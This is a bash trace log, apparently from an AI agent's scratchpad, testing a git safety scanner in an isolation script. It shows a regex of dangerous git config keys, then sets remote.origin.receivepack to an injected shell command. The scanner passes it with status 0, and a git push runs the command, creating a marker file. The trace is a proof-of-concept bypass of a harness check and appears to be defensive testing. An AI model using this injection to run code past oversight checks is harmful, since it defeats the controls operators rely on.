@@ -1,0 +1,140 @@
+bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
++ rm -rf /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2
++ mkdir -p /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2
++ cd /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2
++ git --version
+git version 2.39.5
++ git init -q ws
++ cd ws
++ git -c user.email=a@b -c user.name=a commit -q --allow-empty -m x
++ git remote add origin git@github.com:x/y.git
++ source /workspace/devcontainer-config/cc-isolated.sh
+++ set -euo pipefail
+++ GIT_EXIT_SCAN_KEYS_RE='^(filter\.|core\.fsmonitor|include|hook\.|core\.hookspath|core\.sshcommand|core\.askpass|core\.pager|core\.editor|core\.gitproxy|sequence\.editor|pager\.|credential|diff\.|merge\.|gpg\.|alias\.|submodule\.|protocol\.)'
+++ [[ /workspace/devcontainer-config/cc-isolated.sh == \_ ]]
+++ git_exec_snapshot /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws
+++ local ws=/tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws dirs gd common f out rc line key val d h snap=
+++ hookdirs=()
+++ local -a hookdirs
++++ scan_git_dirs /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws
++++ local ws=/tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws g line common
++++ g=/tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
++++ '[' -f /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git ']'
++++ '[' -d /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git ']'
++++ common=/tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
++++ '[' -f /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git/commondir ']'
+++++ cd /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
+++++ pwd -P
++++ g=/tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
+++++ cd /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
+++++ pwd -P
++++ common=/tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
++++ printf '%s\n%s\n' /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
+++ dirs='/tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
+/tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git'
+++ gd=/tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
+++ common=/tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
+++ snap+='gitdir /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
+commondir /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
+'
+++ hookdirs+=("$common/hooks")
+++ '[' '!' -f /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git/config ']'
+++ for f in "$common/config" "$gd/config.worktree"
+++ '[' -f /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git/config ']'
+++ rc=0
++++ cd /
++++ git --no-pager config --file /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git/config --no-includes --get-regexp '^(filter\.|core\.fsmonitor|include|hook\.|core\.hookspath|core\.sshcommand|core\.askpass|core\.pager|core\.editor|core\.gitproxy|sequence\.editor|pager\.|credential|diff\.|merge\.|gpg\.|alias\.|submodule\.|protocol\.)'
+++ out=
+++ rc=1
+++ '[' 1 -gt 1 ']'
+++ '[' -n '' ']'
+++ continue
+++ for f in "$common/config" "$gd/config.worktree"
+++ '[' -f /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git/config.worktree ']'
+++ continue
+++ for d in "${hookdirs[@]}"
+++ '[' -d /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git/hooks ']'
+++ for f in "$d"/*
+++ case "$f" in
+++ continue
+++ for f in "$d"/*
+++ case "$f" in
+++ continue
+++ for f in "$d"/*
+++ case "$f" in
+++ continue
+++ for f in "$d"/*
+++ case "$f" in
+++ continue
+++ for f in "$d"/*
+++ case "$f" in
+++ continue
+++ for f in "$d"/*
+++ case "$f" in
+++ continue
+++ for f in "$d"/*
+++ case "$f" in
+++ continue
+++ for f in "$d"/*
+++ case "$f" in
+++ continue
+++ for f in "$d"/*
+++ case "$f" in
+++ continue
+++ for f in "$d"/*
+++ case "$f" in
+++ continue
+++ for f in "$d"/*
+++ case "$f" in
+++ continue
+++ for f in "$d"/*
+++ case "$f" in
+++ continue
+++ for f in "$d"/*
+++ case "$f" in
+++ continue
+++ f=/tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git/info/attributes
+++ '[' -s /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git/info/attributes ']'
+++ printf %s 'gitdir /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
+commondir /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
+'
+++ LC_ALL=C
+++ sort -u
++ before='commondir /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
+gitdir /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git'
++ printf '%s\n' 'commondir /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
+gitdir /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git'
+commondir /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
+gitdir /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
++ git init -q --bare .git/evil.git
++ git config remote.origin.url .git/evil.git
++ git config remote.origin.receivepack 'touch /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/MARKER; git-receive-pack'
++ git_exit_scan /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws 'commondir /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
+gitdir /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git'
++ local ws=/tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws 'before=commondir /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
+gitdir /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git' after new errf reason
+++ mktemp
++ errf=/tmp/tmp.NV74E6yfBY
+++ git_exec_snapshot /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws
++ after='commondir /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
+gitdir /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git'
++ rm -f /tmp/tmp.NV74E6yfBY
+++ sed '/^$/d'
+++ LC_ALL=C
+++ comm -13 /dev/fd/63 /dev/fd/62
++++ printf '%s\n' 'commondir /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
+gitdir /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git'
++++ printf '%s\n' 'commondir /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git
+gitdir /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2/ws/.git'
++ new=
++ '[' -n '' ']'
++ return 0
++ echo 'scan status=0'
+scan status=0
++ git push -q origin HEAD:refs/heads/main
++ echo 'push rc=0'
+push rc=0
++ ls /tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2
+MARKER
+ws
+shell=bash; cwd=/tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/rp2; exit-of-wrapper=0; timestamp 2026-09-27T21:37:51Z
